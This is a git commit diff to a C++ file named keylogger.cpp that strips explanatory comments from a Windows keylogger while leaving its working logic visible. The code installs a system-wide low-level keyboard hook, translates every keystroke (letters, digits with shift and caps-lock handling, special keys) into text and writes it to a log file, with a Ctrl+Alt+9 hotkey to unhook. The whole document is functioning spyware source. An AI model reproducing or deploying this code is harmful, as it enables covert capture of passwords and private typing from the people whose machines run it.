a99b6ba78fdbdaf71a4a6508b84baac023d737b3
Hirusha Adikari <36286877+hirusha-adi@users.noreply.github.com>
2022-08-24 17:54:43 +0530

    updates

--- Keylogger/keylogger.cpp
+++ Keylogger/keylogger.cpp
@@ -26,38 +26,25 @@ void log(char s1[])
     fclose(file);
 }
 
-/* An application-defined callback function used with the SetWindowsHookEx function.
- The system calls this function every time a new keyboard input event is about to be posted into a thread input queue.
- 1st Parameter  nCode - A code the hook procedure uses to determine how to process the message.
- 2nd Parameter wParam - The identifier of the keyboard message. This parameter can be one of the
- following messages: WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, or WM_SYSKEYUP.
- 3rd Parameter lParam: A pointer to a KBDLLHOOKSTRUCT structure.
- */
 LRESULT CALLBACK
 LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
-    /* This structure contains information about a low-level keyboard input like virtual code, scan code, flags,
-     time stamp and additional information associated with the message.
-     */
     KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *) lParam;
     char val[5];
     DWORD dwMsg = 1;
     switch (wParam)
     {
 
-    case WM_KEYDOWN: // When the key has been pressed. Changed from WM_KEYUP to catch multiple strokes.
+    case WM_KEYDOWN:
     {
-        // Assign virtual key code to local variable
         DWORD vkCode = pKeyBoard->vkCode;
 
-        if ((vkCode >= 39) && (vkCode <= 64)) // Keys 0-9
+        if ((vkCode >= 39) && (vkCode <= 64))
         {
-            // TODO fix to shift key HELD down
-            if (GetAsyncKeyState(VK_SHIFT)) // Check if shift key is down (fairly accurate)
+            if (GetAsyncKeyState(VK_SHIFT))
             {
                 switch (vkCode)
-                // 0x30-0x39 is 0-9 respectively
-                {
+               {
                 case 0x30:
                     log(")");
                     break;
@@ -90,42 +77,24 @@ LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
                     break;
                 }
             }
-            else // If shift key is not down
+            else
             {
                 sprintf(val, "%c", vkCode);
                 log(val);
             }
         }
-        else if ((vkCode > 64) && (vkCode < 91)) // Keys a-z
+        else if ((vkCode > 64) && (vkCode < 91))
         {
-            /*
-             The following is a complicated statement to check if the letters need to be switched to lowercase.
-             Here is an explanation of why the exclusive or (XOR) must be used.
-
-             Shift   Caps    LowerCase    UpperCase
-             T       T       T            F
-             T       F       F            T
-             F       T       F            T
-             F       F       T            F
-
-             The above truth table shows what case letters are typed in,
-             based on the state of the shift and caps lock key combinations.
-
-             The UpperCase column is the same result as a logical XOR.
-             However, since we're checking the opposite in the following if statement, we'll also include a NOT operator (!)
-             Becuase, NOT(XOR) would give us the LowerCase column results.
-             */
-            if (!(GetAsyncKeyState(VK_SHIFT) ^ isCapsLock())) // Check if letters should be lowercase
+            if (!(GetAsyncKeyState(VK_SHIFT) ^ isCapsLock()))
             {
-                vkCode += 32; // Un-capitalize letters
+                vkCode += 32;
             }
             sprintf(val, "%c", vkCode);
             log(val);
         }
-        else // Every other key
+        else
         {
             switch (vkCode)
-            // Check for other keys
             {
             case VK_CANCEL:
                 log("[Cancel]");
@@ -426,24 +395,9 @@ LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
                     log("=");
                 break;
             default:
-
-                /* For More details refer this link http://msdn.microsoft.com/en-us/library/ms646267
-                 As mentioned in document of GetKeyNameText http://msdn.microsoft.com/en-us/library/ms646300
-                 Scon code is present in 16..23 bits therefor I shifted the code to correct position
-                 Same for Extended key flag
-                 */
                 dwMsg += pKeyBoard->scanCode << 16;
                 dwMsg += pKeyBoard->flags << 24;
-
                 char key[16];
-                /* Retrieves a string that represents the name of a key.
-                 1st Parameter dwMsg contains the scan code and Extended flag
-                 2nd Parameter lpString: lpszName - The buffer that will receive the key name.
-                 3rd Parameter cchSize: The maximum length, in characters, of the key name, including the terminating null character
-                 If the function succeeds, a null-terminated string is copied into the specified buffer,
-                 and the return value is the length of the string, in characters, not counting the terminating null character.
-                 If the function fails, the return value is zero.
-                 */
                 GetKeyNameText(dwMsg, key, 15);
                 log(key);
             }
@@ -451,29 +405,15 @@ LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
         break;
     }
     default:
-
-        /* Passes the hook information to the next hook procedure in the current hook chain.
-         1st Parameter hhk - Optional
-         2nd Parameter nCode - The next hook procedure uses this code to determine how to process the hook information.
-         3rd Parameter wParam - The wParam value passed to the current hook procedure.
-         4th Parameter lParam - The lParam value passed to the current hook procedure
-         */
         return CallNextHookEx(NULL, nCode, wParam, lParam);
     }
     return 0;
 }
 
-// Function called by main function to install hook
 DWORD WINAPI
 KeyLogger(LPVOID lpParameter)
 {
-
     HHOOK hKeyHook;
-    /* Retrieves a module handle for the specified module.
-     parameter is NULL, GetModuleHandle returns a handle to the file used to create the calling process (.exe file).
-     If the function succeeds, the return value is a handle to the specified module.
-     If the function fails, the return value is NULL.
-     */
     HINSTANCE hExe = GetModuleHandle(NULL);
 
     if (!hExe)
@@ -482,49 +422,19 @@ KeyLogger(LPVOID lpParameter)
     }
     else
     {
-        /*Installs an application-defined hook procedure into a hook chain
-         1st Parameter idHook: WH_KEYBOARD_LL - The type of hook procedure to be installed
-         Installs a hook procedure that monitors low-level keyboard input events.
-         2nd Parameter lpfn: LowLevelKeyboardProc - A pointer to the hook procedure.
-         3rd Parameter hMod: hExe - A handle to the DLL containing the hook procedure pointed to by the lpfn parameter.
-         4th Parameter dwThreadId: 0 - the hook procedure is associated with all existing threads running
-         If the function succeeds, the return value is the handle to the hook procedure.
-         If the function fails, the return value is NULL.
-         */
         hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC) LowLevelKeyboardProc, hExe, 0);
-
-        /*Defines a system-wide hot key of alt+ctrl+9
-         1st Parameter hWnd(optional) :NULL - A handle to the window that will receive hot key message generated by hot key.
-         2nd Parameter id:1 - The identifier of the hot key
-         3rd Parameter fsModifiers: MOD_ALT | MOD_CONTROL -  The keys that must be pressed in combination with the key
-         specified by the uVirtKey parameter in order to generate the WM_HOTKEY message.
-         4th Parameter vk: 0x39(9) - The virtual-key code of the hot key
-         */
         RegisterHotKey(NULL, 1, MOD_ALT | MOD_CONTROL, 0x39);
-
         MSG msg;
-
-        // Message loop retrieves messages from the thread's message queue and dispatches them to the appropriate window procedures.
-        // For more info http://msdn.microsoft.com/en-us/library/ms644928%28v=VS.85%29.aspx#creating_loop
-        //Retrieves a message from the calling thread's message queue.
-
         while (GetMessage(&msg, NULL, 0, 0) != 0)
         {
-            // if Hot key combination is pressed then exit
             if (msg.message == WM_HOTKEY)
             {
                 UnhookWindowsHookEx(hKeyHook);
                 return 0;
             }
-            //Translates virtual-key messages into character messages.
             TranslateMessage(&msg);
-            //Dispatches a message to a window procedure.
             DispatchMessage(&msg);
         }
-
-        /* To free system resources associated with the hook and removes a hook procedure installed in a hook chain
-         Parameter hhk: hKeyHook - A handle to the hook to be removed.
-         */
         UnhookWindowsHookEx(hKeyHook);
     }
     return 0;
@@ -533,23 +443,11 @@ KeyLogger(LPVOID lpParameter)
 int start(char* argv[])
 {
     HANDLE hThread;
-
-    /* CreateThread function Creates a thread to execute within the virtual address space of the calling process.
-     1st Parameter lpThreadAttributes:  NULL - Thread gets a default security descriptor.
-     2nd Parameter dwStackSize:  0  - The new thread uses the default size for the executable.
-     3rd Parameter lpStartAddress:  KeyLogger - A pointer to the application-defined function to be executed by the thread
-     4th Parameter lpParameter:  argv[0] -  A pointer to a variable to be passed to the thread
-     5th Parameter dwCreationFlags: 0 - The thread runs immediately after creation.
-     6th Parameter pThreadId(out parameter): NULL - the thread identifier is not returned
-     If the function succeeds, the return value is a handle to the new thread.
-     */
-
     hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) KeyLogger,
             (LPVOID) argv[0], 0, NULL );
 
     if (hThread)
     {
-        // Waits until the specified object is in the signaled state or the time-out interval elapses.
         return WaitForSingleObject(hThread, INFINITE);
     }
     return 1;
